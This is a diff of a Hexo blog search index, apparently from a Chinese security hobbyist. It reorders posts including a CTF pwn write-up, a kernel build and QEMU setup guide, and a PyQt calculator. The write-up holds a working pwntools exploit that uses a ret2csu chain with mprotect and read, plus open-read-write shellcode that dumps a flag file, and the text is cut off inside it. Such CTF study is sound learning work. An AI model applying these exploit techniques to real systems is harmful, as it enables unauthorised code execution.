@@ -1,69 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>不同类型的shellcode题解法</title>
-    <url>/2025/12/06/2025-12-06-%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%E7%9A%84shellcode%E9%A2%98%E8%A7%A3%E6%B3%95/</url>
-    <content><![CDATA[<h1>2025 星芒杯</h1>
-<h2 id="分析">分析</h2>
-<p><img src="./img/image-20251206184048107.png" alt="image-20251206184048107"></p>
-<p>只能输入七个字节，且输入完后权限改为了<code>r-x</code>，shellcode段不可写</p>
-<p>解决方法为打栈</p>
-<p>shellcode:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor     edi, edi</span><br><span class="line">push    rsp</span><br><span class="line">pop     rsi</span><br><span class="line">syscall </span><br><span class="line">ret     </span><br></pre></td></tr></table></figure>
-<p>最后csu套csu mprotect然后read</p>
-<h2 id="EXP">EXP</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">author: mick0960</span></span><br><span class="line"><span class="string">time: 2025-12-06 11:24:33</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch, data: p.sendlineafter(ch, data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch, data: p.sendafter(ch, data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data: p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ru = <span class="keyword">lambda</span> con: p.recvuntil(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">addr</span>):</span><br><span class="line">    frame = inspect.currentframe().f_back</span><br><span class="line">    variables = &#123;<span class="built_in">id</span>(val): name <span class="keyword">for</span> name, val <span class="keyword">in</span> frame.f_locals.items()&#125;</span><br><span class="line">    addr_name = variables.get(<span class="built_in">id</span>(addr), <span class="string">&quot;Unknown&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;<span class="subst">&#123;addr_name&#125;</span> --&gt; <span class="subst">&#123;<span class="built_in">hex</span>(addr) <span class="keyword">if</span> <span class="built_in">isinstance</span>(addr, <span class="built_in">int</span>) <span class="keyword">else</span> addr&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">pie=<span class="number">0</span>, bp=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = p.libs()[p.elf.path]</span><br><span class="line">        <span class="keyword">if</span> bp:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">str</span>):</span><br><span class="line">                bp = <span class="string">f&quot;*<span class="subst">&#123;<span class="built_in">hex</span>(base + <span class="built_in">int</span>(bp, <span class="number">16</span>))&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">list</span>):</span><br><span class="line">                bp = [<span class="string">f&quot;*<span class="subst">&#123;<span class="built_in">hex</span>(base + <span class="built_in">int</span>(b, <span class="number">16</span>))&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> bp]</span><br><span class="line">        gdb.attach(p, gdbscript=<span class="string">&quot;\n&quot;</span>.join(bp) <span class="keyword">if</span> bp <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> bp:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">str</span>):</span><br><span class="line">                bp = <span class="string">f&quot;b *<span class="subst">&#123;bp&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">list</span>):</span><br><span class="line">                bp = [<span class="string">f&quot;b *<span class="subst">&#123;b&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> bp]</span><br><span class="line">        gdb.attach(p, gdbscript=<span class="string">&quot;\n&quot;</span>.join(bp) <span class="keyword">if</span> bp <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------function area end------------------#</span></span><br><span class="line"><span class="comment"># ----------------predefine area start------------------#</span></span><br><span class="line">elf_name = <span class="string">&quot;/mnt/f/challenges/test/attachment&quot;</span></span><br><span class="line">p = process(elf_name)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = context.binary = ELF(elf_name)</span><br><span class="line">libc_name = <span class="string">&quot;&quot;</span></span><br><span class="line">libc = ELF(libc_name) <span class="keyword">if</span> libc_name <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------predefine area end------------------#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">func, edi, rsi, rdx, ret</span>):</span><br><span class="line">    payload = p64(<span class="number">0x4013AA</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)  <span class="comment"># rbx</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)  <span class="comment"># rbp</span></span><br><span class="line">    payload += p64(edi)  <span class="comment"># edi</span></span><br><span class="line">    payload += p64(rsi)  <span class="comment"># rsi</span></span><br><span class="line">    payload += p64(rdx)  <span class="comment"># rdx</span></span><br><span class="line">    payload += p64(func)  <span class="comment"># func</span></span><br><span class="line">    payload += p64(<span class="number">0x401390</span>) + p64(<span class="number">0</span>) * <span class="number">7</span> + ret</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base = <span class="number">0x600000</span></span><br><span class="line">shellcode = <span class="string">&quot;\x31\xff\x54\x5e\x0f\x05\xc3&quot;</span></span><br><span class="line"><span class="comment"># debug(pie=0, bp=[&#x27;0x4012fc&#x27;])</span></span><br><span class="line">sda(<span class="string">&quot;can do?&quot;</span>, shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sd(</span><br><span class="line">    csu(</span><br><span class="line">        elf.got.mprotect,</span><br><span class="line">        base,</span><br><span class="line">        <span class="number">0x1000</span>,</span><br><span class="line">        <span class="number">7</span>,  <span class="comment"># mprotect(base, 0x1000, 7)</span></span><br><span class="line">        csu(elf.got.read, <span class="number">0</span>, base, <span class="number">0x1000</span>, p64(base)),  <span class="comment"># read(0, base, 0x1000)</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">orw = asm(</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">)</span><br><span class="line">sd(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>题解</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>seccomp</tag>
-        <tag>sandbox</tag>
-        <tag>shellcode</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Kernel PWN——内核编译以及模拟</title>
-    <url>/2025/02/19/Kernel-PWN%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%A8%A1%E6%8B%9F/</url>
-    <content><![CDATA[<h1>编译</h1>
-<p>内核版本下载，这里随便选一个LTS版本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.4.98.tar.xz</span><br></pre></td></tr></table></figure>
-<p>下载完解压进入对应的目录来配置一些选项</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.4.98/</span><br><span class="line">make menuconfig <span class="comment"># Kernel hacking -&gt; Compile-time checks and compiler options -&gt; [*]Compile the kernel with debug info</span></span><br><span class="line">make -j3 bzImage</span><br></pre></td></tr></table></figure>
-<p>编译好后会显示如下信息</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kernel: <span class="built_in">arch</span>/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure>
-<p>编译便到此结束</p>
-<h1>QEMU模拟</h1>
-<p>这里首先需要安装busybox来模拟文件系统</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.32.1.tar.bz2</span><br><span class="line">tar -jxf busybox-1.32.1.tar.bz2</span><br></pre></td></tr></table></figure>
-<p>然后进行配置</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line"><span class="comment"># Setttings -&gt; [*] Build static binary (no shared libs)</span></span><br><span class="line"><span class="comment"># Linux System Utilities -&gt; [] Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)</span></span><br><span class="line"><span class="comment"># Networking Utilities -&gt; [] inetd</span></span><br></pre></td></tr></table></figure>
-<p>编译</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make -j3</span><br></pre></td></tr></table></figure>
-<p>创建<code>_install</code>目录</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>
-<p><font style="color:rgba(0, 0, 0, 0.87);">在 </font><code>_install</code><font style="color:rgba(0, 0, 0, 0.87);"> 目录下创建以下文件夹</font></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>
-<p>创建<code>init</code>启动脚本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure>
-<p>随后在该目录下打包文件系统</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line"><span class="comment"># 打包的文件系统在上一级目录下</span></span><br></pre></td></tr></table></figure>
-<h1>启动！</h1>
-<p>启动脚本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>
-<p><img src="/images/pasted-28.png" alt="upload successful"></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>Kernel PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2024年度总结</title>
     <url>/2025/01/26/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
@@ -143,6 +80,20 @@
       <tags>
         <tag>PWN</tag>
         <tag>House系列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PyQt6学习第一天——基础框架、信号与槽和第一个计算器程序</title>
+    <url>/2024/08/09/PyQt6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A1%86%E6%9E%B6%E5%92%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E5%99%A8%E7%A8%8B%E5%BA%8F/</url>
+    <content><![CDATA[<h2 id="基础框架">基础框架</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QApplication, QWidget</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = MyWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>
+<h2 id="第一个计算器程序">第一个计算器程序</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QWidget, QApplication</span><br><span class="line"><span class="keyword">from</span> Ui_Calculator <span class="keyword">import</span> Ui_Form</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">calcWindow</span>(QWidget, Ui_Form):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.setupUi(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.bind()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 批量为 btn0 到 btn9 添加点击事件</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            button = <span class="built_in">getattr</span>(<span class="variable language_">self</span>, <span class="string">f&#x27;btn<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">            button.clicked.connect(<span class="keyword">lambda</span> _, b=button: <span class="variable language_">self</span>.addNumber(b.text()))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 为运算按钮添加点击事件</span></span><br><span class="line">        operators = &#123;</span><br><span class="line">            <span class="string">&#x27;btn_multiply&#x27;</span>: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_divide&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_substract&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_plus&#x27;</span>: <span class="string">&#x27;+&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> btn_name, symbol <span class="keyword">in</span> operators.items():</span><br><span class="line">            button = <span class="built_in">getattr</span>(<span class="variable language_">self</span>, btn_name)</span><br><span class="line">            button.clicked.connect(<span class="keyword">lambda</span> _, s=symbol: <span class="variable language_">self</span>.addNumber(s) <span class="keyword">if</span> <span class="variable language_">self</span>.isValid() <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.btn_equal.clicked.connect(<span class="variable language_">self</span>.calcResult)</span><br><span class="line">        <span class="variable language_">self</span>.btn_clear.clicked.connect(<span class="variable language_">self</span>.clearBox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clearBox</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.result_box.clear()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calcResult</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = <span class="built_in">str</span>(<span class="built_in">eval</span>(<span class="variable language_">self</span>.result))</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(result)</span><br><span class="line">            <span class="variable language_">self</span>.result = result</span><br><span class="line">        <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(<span class="string">&quot;Cannot divide by zero&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isValid</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.result_box.text()[-<span class="number">1</span>:].isdigit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addNumber</span>(<span class="params">self, num: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.result += num</span><br><span class="line">        <span class="variable language_">self</span>.result_box.setText(<span class="variable language_">self</span>.result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = calcWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>PyQT</tag>
       </tags>
   </entry>
   <entry>
@@ -325,29 +276,72 @@
         <category>PWN</category>
       </categories>
       <tags>
-        <tag>pwn</tag>
         <tag>ptmalloc2</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
-    <title>PyQt6学习第一天——基础框架、信号与槽和第一个计算器程序</title>
-    <url>/2024/08/09/PyQt6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A1%86%E6%9E%B6%E5%92%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E5%99%A8%E7%A8%8B%E5%BA%8F/</url>
-    <content><![CDATA[<h2 id="基础框架">基础框架</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QApplication, QWidget</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = MyWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>
-<h2 id="第一个计算器程序">第一个计算器程序</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QWidget, QApplication</span><br><span class="line"><span class="keyword">from</span> Ui_Calculator <span class="keyword">import</span> Ui_Form</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">calcWindow</span>(QWidget, Ui_Form):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.setupUi(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.bind()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 批量为 btn0 到 btn9 添加点击事件</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            button = <span class="built_in">getattr</span>(<span class="variable language_">self</span>, <span class="string">f&#x27;btn<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">            button.clicked.connect(<span class="keyword">lambda</span> _, b=button: <span class="variable language_">self</span>.addNumber(b.text()))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 为运算按钮添加点击事件</span></span><br><span class="line">        operators = &#123;</span><br><span class="line">            <span class="string">&#x27;btn_multiply&#x27;</span>: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_divide&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_substract&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_plus&#x27;</span>: <span class="string">&#x27;+&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> btn_name, symbol <span class="keyword">in</span> operators.items():</span><br><span class="line">            button = <span class="built_in">getattr</span>(<span class="variable language_">self</span>, btn_name)</span><br><span class="line">            button.clicked.connect(<span class="keyword">lambda</span> _, s=symbol: <span class="variable language_">self</span>.addNumber(s) <span class="keyword">if</span> <span class="variable language_">self</span>.isValid() <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.btn_equal.clicked.connect(<span class="variable language_">self</span>.calcResult)</span><br><span class="line">        <span class="variable language_">self</span>.btn_clear.clicked.connect(<span class="variable language_">self</span>.clearBox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clearBox</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.result_box.clear()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calcResult</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = <span class="built_in">str</span>(<span class="built_in">eval</span>(<span class="variable language_">self</span>.result))</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(result)</span><br><span class="line">            <span class="variable language_">self</span>.result = result</span><br><span class="line">        <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(<span class="string">&quot;Cannot divide by zero&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isValid</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.result_box.text()[-<span class="number">1</span>:].isdigit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addNumber</span>(<span class="params">self, num: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.result += num</span><br><span class="line">        <span class="variable language_">self</span>.result_box.setText(<span class="variable language_">self</span>.result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = calcWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>]]></content>
+    <title>不同类型的shellcode题解法</title>
+    <url>/2025/12/06/2025-12-06-%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%E7%9A%84shellcode%E9%A2%98%E8%A7%A3%E6%B3%95/</url>
+    <content><![CDATA[<h1>2025 星芒杯</h1>
+<h2 id="分析">分析</h2>
+<p><img src="https://cdn.jsdelivr.net/gh/mick0960/image-bed@img/img/20251206191942237.png" alt="image-20251206191942174"></p>
+<p>只能输入七个字节，且输入完后权限改为了<code>r-x</code>，shellcode段不可写</p>
+<p>解决方法为打栈</p>
+<p>shellcode:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor     edi, edi</span><br><span class="line">push    rsp</span><br><span class="line">pop     rsi</span><br><span class="line">syscall </span><br><span class="line">ret     </span><br></pre></td></tr></table></figure>
+<p>最后csu套csu mprotect然后read</p>
+<h2 id="EXP">EXP</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">author: mick0960</span></span><br><span class="line"><span class="string">time: 2025-12-06 11:24:33</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch, data: p.sendlineafter(ch, data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch, data: p.sendafter(ch, data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data: p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ru = <span class="keyword">lambda</span> con: p.recvuntil(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">addr</span>):</span><br><span class="line">    frame = inspect.currentframe().f_back</span><br><span class="line">    variables = &#123;<span class="built_in">id</span>(val): name <span class="keyword">for</span> name, val <span class="keyword">in</span> frame.f_locals.items()&#125;</span><br><span class="line">    addr_name = variables.get(<span class="built_in">id</span>(addr), <span class="string">&quot;Unknown&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;<span class="subst">&#123;addr_name&#125;</span> --&gt; <span class="subst">&#123;<span class="built_in">hex</span>(addr) <span class="keyword">if</span> <span class="built_in">isinstance</span>(addr, <span class="built_in">int</span>) <span class="keyword">else</span> addr&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">pie=<span class="number">0</span>, bp=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = p.libs()[p.elf.path]</span><br><span class="line">        <span class="keyword">if</span> bp:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(bp, <span class="built_in">str</span>):</span><br><span class="line">                bp = <span class="string">f&quot;*<span 